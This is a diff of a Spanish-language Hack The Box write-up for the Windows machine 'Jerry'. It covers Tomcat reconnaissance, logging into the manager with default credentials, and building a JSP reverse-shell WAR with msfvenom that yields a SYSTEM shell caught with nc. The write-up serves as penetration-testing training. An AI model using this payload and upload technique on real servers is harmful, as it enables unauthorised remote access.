@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Jerry - Hack The Box
-excerpt: "Esta es una máquina bastante sencilla, realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un Payload en lugar de un Exploit para crear una Backdoor en la máquina para que nos devuelva una Shell."
+excerpt: "Esta es una máquina bastante sencilla realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder ganar acceso, nos autenticaremos usando credenciales que nos muestra el servicio Tomcat al momento de fallar la autentiacación, observamos que se pueden subir archivos tipo .WAR a este servicio, por lo que vamos a usar un Payload en lugar de usar un Exploit para crear una Reverse Shell que nos conecte a la máquina al ejecutar este archivo malicioso, no será necesario escalar privilegios ya que una vez conectados seremos el usuario administrador y obtendremos las flags."
 date: 2023-01-15
 classes: wide
 header:
@@ -15,14 +15,16 @@ tags:
   - Windows
   - Tomcat
   - Malicious Payload
-  - Abusing File Upload
   - Reverse Shell
+  - Privesc - Abusing Tomcat File Upload
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-jerry/jerry_logo.png)
-Esta es una máquina bastante sencilla, realizada en **Windows** y en la cual vamos a usar el **servicio Tomcat** para poder hackearla, usando un **Payload** en lugar de un Exploit, para crear una **Backdoor** en la máquina para que nos devuelva una **Shell**.
+
+Esta es una máquina bastante sencilla realizada en **Windows** y en la cual vamos a usar el **servicio Tomcat** para poder ganar acceso, nos autenticaremos usando credenciales que nos muestra el **servicio Tomcat** al momento de fallar la autentiacación, observamos que se pueden subir archivos **tipo .WAR** a este servicio, por lo que vamos a usar un **Payload** en lugar de usar un **Exploit** para crear una **Reverse Shell** que nos conecte a la máquina al ejecutar este **archivo malicioso**, no será necesario escalar privilegios ya que una vez conectados seremos el usuario **administrador** y obtendremos las **flags**. 
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *whatweb*
 * *wfuzz*
@@ -50,7 +52,7 @@ Herramientas utilizadas:
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#BuscandoPay">Buscando y Configurando un Payload</a></li>
-				<li><a href="Exploit">Accediendo a la Máquina</a></li>
+				<li><a href="#Exploit">Accediendo a la Máquina</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -61,10 +63,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -149,7 +148,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
 Vemos que el servicio que opera es el **Tomcat**, además de ver que es una página web podemos analizarla también con la herramienta **"whatweb"** siendo que nos dará el mismo resultado pero con un poco más de información. OJO, en este caso hay que indicarle el puerto, esto se hace porque el puerto está ocupando proxy, si no fuera ese caso, solo se pondría la IP de la máquina y listo:
-```shell
+```bash
 whatweb http://10.10.10.95:8080/
 http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
 ```
@@ -158,15 +157,12 @@ http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServ
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="Inves">Investigación del Servicio</h2>
+<h2 id="Invest">Investigación del Servicio</h2>
 
 Bueno, pero ¿qué chuchas es el servicio Tomcat? pues vamos a investigarlo:
 
@@ -196,20 +192,6 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
 =====================================================================
 
-000000001:   200        201 L    495 W      11398 Ch    "# directory-list-2.3-medium.txt"                                                                                                                                         
-000000007:   200        201 L    495 W      11398 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                         
-000000003:   200        201 L    495 W      11398 Ch    "# Copyright 2007 James Fisher"                                                                                                                                           
-000000014:   200        201 L    495 W      11398 Ch    "http://10.10.10.95:8080//"                                                                                                                                               
-000000011:   200        201 L    495 W      11398 Ch    "# Priority ordered case sensative list, where entries were found"                                                                                                        
-000000012:   200        201 L    495 W      11398 Ch    "# on atleast 2 different hosts"                                                                                                                                          
-000000013:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
-000000010:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
-000000008:   200        201 L    495 W      11398 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                              
-000000005:   200        201 L    495 W      11398 Ch    "# This work is licensed under the Creative Commons"                                                                                                                      
-000000006:   200        201 L    495 W      11398 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                           
-000000002:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
-000000009:   200        201 L    495 W      11398 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                     
-000000004:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
 000000090:   200        282 L    1494 W     19677 Ch    "docs"                                                                                                                                                                    
 000000902:   200        32 L     152 W      1285 Ch     "examples"                                                                                                                                                                
 000004889:   302        0 L      0 W        0 Ch        "manager"                                                                                                                                                                 
@@ -228,6 +210,8 @@ Requests/sec.: 0
 | *--hc*     | Para no mostrar un código de estado en los resultados. |
 | *-t*       | Para indicar la cantidad de hilos a usar. |
 | *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
 
 Nos muestra 3 directorios, el que nos puede resultar más útil es el de **manager**, porque desde ahí podemos configurar y ver más información sobre la máquina y el servicio activo. Primero, vamos a entrar a la página por default.
 
@@ -249,14 +233,12 @@ Listo, hemos podido entrar.
 
 Analizando un poco la página, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que, podemos usar esto para buscar un payload malicioso que podamos usar, pues lo que podemos subir es una **Reverse Shell** y con eso obtenemos una **Shell** conectada, osease que lo que estamos haciendo es una **BackDoor**.
 
+
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -285,7 +267,7 @@ Vamos a ocupar este Payload: **java/jsp_shell_reverse_tcp** que como su descripc
 
 Y ya solamente lo podemos guardar con un nombre en específico, yo lo llame **shell.war**:
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f war -o shell.war
 Payload size: 1096 bytes
 Final size of war file: 1096 bytes
 Saved as: shell.war
@@ -317,7 +299,7 @@ Le damos click al archivo **.war**:
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
 
-connect to [10.10.14.10] from (UNKNOWN) [10.10.10.95] 49192
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.95] 49192
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
@@ -326,7 +308,7 @@ C:\apache-tomcat-7.0.88>whoami
 nt authority\system
 ```
 Y ya solamente es buscar las flags, que normalmente siempre están alojadas en la carpeta usuarios, dentro del escritorio del usuario y del administrados:
-```bash
+```batch
 :\apache-tomcat-7.0.88>cd C:\
 cd C:\
 
@@ -374,9 +356,9 @@ Directory of C:\Users\Administrator\Desktop
                0 File(s)              0 bytes
                3 Dir(s)   2,418,688,000 bytes free
 ```
-Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahí estará lo que buscamos:
 
-```bash
+Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahí estará lo que buscamos:
+```batch
 C:\Users\Administrator\Desktop>cd flags
 cd flags
 
@@ -396,20 +378,63 @@ C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
 type "2 for the price of 1.txt"
 ```
 
-De esta forma, no es necesario ya escalar privilegios, pues ya somos administradores y tampoco es necesario usar **Metasploit Framework**, porque sería complicarnos un poco la vida y eso no es lo que buscamos.
+De esta forma, no es necesario ya escalar privilegios, pues ya somos administradores y tampoco es necesario usar **Metasploit Framework**, aunque podrias probarlo.
 
 
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://tomcat.apache.org/tomcat-7.0-doc/html-manager-howto.html
 * https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
